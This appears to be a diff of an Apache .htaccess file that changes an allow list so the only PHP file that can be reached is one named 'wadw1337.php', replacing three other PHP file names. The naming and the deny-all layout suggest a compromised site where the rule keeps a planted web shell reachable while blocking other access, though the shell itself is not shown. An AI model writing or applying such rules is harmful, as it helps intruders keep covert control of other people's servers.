@@ -27,7 +27,7 @@
     Deny from all
 </Files>
 
-<FilesMatch "^(index.html|kontroz.php|lite.php|lite2.php)$">
+<FilesMatch "^(index.html|wadw1337.php)$">
 
  Order allow,deny
 
